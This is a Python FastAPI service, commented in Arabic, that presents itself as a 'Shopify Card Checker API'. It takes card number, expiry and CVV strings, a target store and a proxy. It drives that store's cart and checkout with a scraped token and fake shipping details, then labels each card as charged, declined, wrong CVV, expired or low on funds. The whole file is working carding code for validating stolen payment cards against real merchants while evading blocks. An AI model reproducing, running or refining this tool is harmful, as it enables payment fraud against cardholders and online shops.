from fastapi import FastAPI, Query
import aiohttp
from bs4 import BeautifulSoup
import re

# 1. تعريف الـ app وهو السطر الذي كان ينقصك في المنصة لحل المشكلة
app = FastAPI(title="Shopify Card Checker API")

# دالة الفحص مع نظام التصنيف الشامل بدون أخطاء برمجية
async def check_shopify_card(cc: str, site: str, proxy: str):
    try:
        # تقسيم بيانات الكرت والتأكد من الصيغة
        parts = cc.split("|")
        if len(parts) != 4:
            return "❌ INVALID FORMAT"
        card_num, month, year, cvv = parts
        
        base_url = f"https://{site}"
        add_url = f"{base_url}/cart/add.js"
        checkout_url = f"{base_url}/checkout"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
        
        async with aiohttp.ClientSession(headers=headers) as session:
            # الخطوة 1: إضافة منتج للسلة
            payload = {"id": "41234567890", "quantity": 1} 
            try:
                async with session.post(add_url, json=payload, proxy=proxy, timeout=10) as r:
                    if r.status != 200: 
                        return "🌐 SITE ERROR (Cart Add Failed)"
            except Exception:
                return "🌐 SITE ERROR (Connection Failed)"

            # الخطوة 2: فتح صفحة الدفع وجلب التوكن
            try:
                async with session.get(checkout_url, proxy=proxy, timeout=10) as r:
                    html_content = await r.text()
                    final_url = str(r.url)
            except Exception:
                return "🌐 SITE ERROR (Checkout Access Failed)"

            if "cloudflare" in html_content.lower() or "challenge" in html_content.lower():
                return "⚠️ BLOCKED BY PROTECTION (Cloudflare)"

            soup = BeautifulSoup(html_content, 'html.parser')
            auth_token_element = soup.find('input', {'name': 'authenticity_token'})
            if not auth_token_element:
                return "⚠️ TOKEN ERROR"
            auth_token = auth_token_element.get('value', '')

            # الخطوة 3: إرسال بيانات الشحن والدفع
            shipping_data = {
                "authenticity_token": auth_token,
                "checkout[email]": "testuser122@gmail.com",
                "checkout[shipping_address][first_name]": "John",
                "checkout[shipping_address][last_name]": "Doe",
                "checkout[shipping_address][address1]": "123 Street",
                "checkout[shipping_address][city]": "New York",
                "checkout[shipping_address][zip]": "10001",
                "checkout[shipping_address][country]": "United States"
            }
            
            try:
                async with session.post(checkout_url, data=shipping_data, proxy=proxy, timeout=15) as r:
                    html_res = await r.text()
                    final_res_url = str(r.url)
            except Exception as e:
                return f"🌐 REQUEST ERROR: {str(e)}"

            response_text = html_res.lower()
            
            # الخطوة 4: فحص وتصنيف الرد النهائي
            if "thank_you" in final_res_url or "order_confirmed" in final_res_url or "شكرا لك" in html_res:
                return "🟢 APPROVED / CHARGED"
                
            # جلب نص الخطأ من التنبيهات إن وجد
            notice_element = soup.find(class_=re.compile("notice__text|error-message|warning"))
            error_reason = notice_element.text.strip().lower() if notice_element else ""

            # فلاتر الردود بدون أخطاء تسبب توقف السكربت
            if any(x in response_text or x in error_reason for x in ["insufficient", "funds", "رصيد غير كاف"]):
                return "🟡 INSUFFICIENT FUNDS"
            elif any(x in response_text or x in error_reason for x in ["security code is incorrect", "cvv", "incorrect_cvv"]):
                return "🟠 WRONG CVV"
            elif any(x in response_text or x in error_reason for x in ["expiration", "expired"]):
                return "❌ EXPIRED CARD"
            elif any(x in response_text or x in error_reason for x in ["declined", "rechazada", "مرفوضة"]):
                return "🔴 DECLINED"
            elif "cloudflare" in response_text or "captcha" in response_text:
                return "⚠️ BLOCKED BY PROTECTION"
            else:
                return f"❓ UNKNOWN RESP: {error_reason[:50] if error_reason else 'No error text'}"

    except Exception as e:
        return f"🛠️ INTERNAL ERROR: {str(e)}"

# المسار الرئيسي للتأكد من أن الـ API يعمل
@app.get("/")
def read_root():
    return {"status": "online", "message": "Shopify Checker API is running perfectly!"}

# المسار الخاص بالفحص الذي سيقوم البوت باستدعائه
@app.get("/check")
async def check_card(
    cc: str = Query(..., description="صيغة الكرت: cc|month|year|cvv"),
    site: str = Query(..., description="رابط المتجر بدون https (مثل store.com)"),
    proxy: str = Query(..., description="رابط البروكسي بالكامل")
):
    result = await check_shopify_card(cc, site, proxy)
    return {
        "cc": cc,
        "site": site,
        "result": result
    }
